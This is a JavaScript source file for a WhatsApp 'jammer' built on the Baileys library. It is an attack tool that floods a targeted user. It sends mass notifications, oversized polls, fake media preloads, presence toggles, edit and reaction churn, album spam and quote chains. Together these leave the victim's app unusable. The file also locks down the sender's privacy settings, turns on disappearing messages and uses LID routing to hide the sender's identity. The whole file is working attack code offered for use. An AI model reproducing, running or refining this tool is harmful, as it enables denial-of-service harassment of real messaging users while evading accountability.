// ./SY/S7/shahxu-jam.js
// shahxu-jam — invisible multi-layer WhatsApp jammer for modern builds.
// Invisible layer: privacy lockdown + LID routing + disappearing mode.
// Jam layers: notification flood, poll/DB pressure, media preload,
// presence storm, edit/react churn, album spam, quote chain.
// Result: victim app open but saturated — can't send, can't scroll,
// can't receive cleanly. Sender identity suppressed where possible.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- relay ----------
async function relay(client, targetJid, content, extra = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(targetJid, content, { userJid });
    await client.relayMessage(targetJid, waMsg.message, {
        messageId: waMsg.key.id,
        ...extra,
    });
    return waMsg.key.id;
}

// ---------- LID routing ----------
async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return { jid: lid, mode: 'lid' };
        }
    } catch {}
    return { jid: targetJid, mode: 'pn' };
}

// ---------- privacy arm ----------
async function armPrivacy(client) {
    const ops = {
        updateLastSeenPrivacy: 'none',
        updateOnlinePrivacy: 'none',
        updateProfilePicturePrivacy: 'none',
        updateStatusPrivacy: 'none',
        updateReadReceiptsPrivacy: 'none',
        updateGroupsAddPrivacy: 'none',
        updateCallPrivacy: 'none',
    };
    let ok = 0;
    for (const [method, value] of Object.entries(ops)) {
        if (typeof client[method] !== 'function') continue;
        try { await client[method](value); ok++; } catch {}
    }
    return ok;
}

// ---------- ephemeral ----------
async function enableDisappearing(client, seconds = 86400) {
    try {
        if (typeof client.updateDefaultDisappearingMode === 'function') {
            await client.updateDefaultDisappearingMode(seconds);
            return true;
        }
    } catch {}
    return false;
}

// ============================================================
// LAYER 1 — notification queue flood
// ============================================================
async function notifFlood(client, jid, count = 150) {
    for (let i = 0; i < count; i++) {
        try {
            await relay(client, jid, {
                extendedTextMessage: {
                    text: `⚡ ${i} ${'N'.repeat(200)}`,
                    contextInfo: { mentionedJid: [jid] },
                },
            });
        } catch {}
        if (i % 15 === 0) await delay(250);
    }
}

// ============================================================
// LAYER 2 — poll/DB write pressure
// ============================================================
async function pollPressure(client, jid, rounds = 20) {
    const options = [];
    for (let i = 0; i < 100; i++) {
        options.push({ optionName: `o${i}_${'x'.repeat(80)}` });
    }
    for (let r = 0; r < rounds; r++) {
        try {
            await relay(client, jid, {
                pollCreationMessageV3: {
                    name: `p${r}_${'P'.repeat(240)}`,
                    options,
                    selectableOptionsCount: 1,
                },
            });
        } catch {}
        await delay(400);
    }
}

// ============================================================
// LAYER 3 — media preload bomb
// ============================================================
async function mediaPreloadBomb(client, jid, count = 30) {
    for (let i = 0; i < count; i++) {
        try {
            await relay(client, jid, {
                audioMessage: {
                    url: `https://mmg.whatsapp.net/fake-${Date.now()}-${i}`,
                    mimetype: 'audio/ogg; codecs=opus',
                    fileSha256: new Uint8Array(32),
                    fileLength: 50000000,
                    seconds: 3600,
                    ptt: true,
                    mediaKey: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    directPath: '/v/t62.7117-24/fake',
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                },
            });
        } catch {}
        await delay(300);
    }
}

// ============================================================
// LAYER 4 — presence toggle storm
// ============================================================
async function presenceStorm(client, jid, rounds = 40) {
    const states = ['composing', 'paused', 'recording', 'paused'];
    for (let i = 0; i < rounds; i++) {
        try {
            if (typeof client.sendPresenceUpdate === 'function') {
                await client.sendPresenceUpdate(states[i % states.length], jid);
            }
        } catch {}
        await delay(120);
    }
}

// ============================================================
// LAYER 5 — edit + reaction churn
// ============================================================
async function editReactChurn(client, jid, count = 200) {
    let seedId;
    try {
        seedId = await relay(client, jid, { conversation: '.' });
    } catch {
        return;
    }
    await delay(400);

    const emojis = ['🔥','💀','⚡','👿','💣','🚨','😈','☠️'];
    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(jid, {
                text: `e${i}_${'E'.repeat(150)}`,
                edit: { remoteJid: jid, id: seedId, fromMe: true },
            });
        } catch {}

        if (i % 5 === 0) {
            try {
                await client.sendMessage(jid, {
                    react: {
                        text: emojis[i % emojis.length],
                        key: { remoteJid: jid, id: seedId, fromMe: true },
                    },
                });
            } catch {}
        }
        if (i % 30 === 0) await delay(200);
    }
}

// ============================================================
// LAYER 6 — grouped album spam
// ============================================================
async function albumSpam(client, jid, albums = 20) {
    for (let a = 0; a < albums; a++) {
        const albumId = `A${Date.now()}${a}`;
        const group = 4;
        for (let g = 0; g < group; g++) {
            try {
                await relay(client, jid, {
                    imageMessage: {
                        url: `https://mmg.whatsapp.net/album-${a}-${g}`,
                        mimetype: 'image/jpeg',
                        fileSha256: new Uint8Array(32),
                        fileLength: 5000000,
                        height: 1080,
                        width: 1080,
                        mediaKey: new Uint8Array(32),
                        fileEncSha256: new Uint8Array(32),
                        directPath: '/v/t62.7118-24/album',
                        mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                        contextInfo: { albumId },
                    },
                });
            } catch {}
            await delay(80);
        }
        await delay(400);
    }
}

// ============================================================
// LAYER 7 — quoted-reply chain amplifier
// ============================================================
async function quoteChain(client, jid, count = 80) {
    let lastId;
    for (let i = 0; i < count; i++) {
        const content = {
            extendedTextMessage: {
                text: `q${i}_${'Q'.repeat(120)}`,
                contextInfo: lastId ? {
                    quotedMessage: { conversation: `q${i - 1}` },
                    participant: jid,
                    remoteJid: jid,
                    stanzaId: lastId,
                    quotedType: 0,
                } : undefined,
            },
        };
        try {
            lastId = await relay(client, jid, content);
        } catch {}
        if (i % 20 === 0) await delay(200);
    }
}

// ============================================================
// ORCHESTRATOR
// ============================================================
async function shahxuJam(client, targetJid, options = {}) {
    if (!client) throw new Error('shahxu-jam: client required');
    if (!targetJid) throw new Error('shahxu-jam: targetJid required');

    const arm    = options.arm !== false;
    const useLid = options.useLid !== false;

    const privacyArmed = arm ? await armPrivacy(client) : 0;
    const disappearing = arm ? await enableDisappearing(client, 86400) : false;

    const resolved = useLid
        ? await resolveBestJid(client, targetJid)
        : { jid: targetJid, mode: 'pn' };

    const jid = resolved.jid;

    const rounds         = options.rounds         ?? 2;
    const notifCount     = options.notifCount     ?? 150;
    const pollRounds     = options.pollRounds     ?? 20;
    const mediaCount     = options.mediaCount     ?? 30;
    const presenceRounds = options.presenceRounds ?? 40;
    const editCount      = options.editCount      ?? 200;
    const albumCount     = options.albumCount     ?? 20;
    const quoteCount     = options.quoteCount     ?? 80;
    const gapMs          = options.gapMs          ?? 600;

    const report = {
        jid,
        mode: resolved.mode,
        privacyArmed,
        disappearing,
        rounds: 0,
        layers: {},
    };

    for (let r = 0; r < rounds; r++) {
        const layerRuns = [
            ['notif',    () => notifFlood(client, jid, notifCount)],
            ['poll',     () => pollPressure(client, jid, pollRounds)],
            ['media',    () => mediaPreloadBomb(client, jid, mediaCount)],
            ['presence', () => presenceStorm(client, jid, presenceRounds)],
            ['churn',    () => editReactChurn(client, jid, editCount)],
            ['album',    () => albumSpam(client, jid, albumCount)],
            ['quote',    () => quoteChain(client, jid, quoteCount)],
        ];

        const results = await Promise.allSettled(
            layerRuns.map(([, fn]) => fn())
        );

        layerRuns.forEach(([name], i) => {
            const ok = results[i].status === 'fulfilled';
            report.layers[name] = (report.layers[name] || 0) + (ok ? 1 : 0);
            if (!ok) {
                report.layers[name + '_fail'] =
                    (report.layers[name + '_fail'] || 0) + 1;
            }
        });

        report.rounds++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    shahxuJam,
    notifFlood,
    pollPressure,
    mediaPreloadBomb,
    presenceStorm,
    editReactChurn,
    albumSpam,
    quoteChain,
    resolveBestJid,
    armPrivacy,
    enableDisappearing,
};
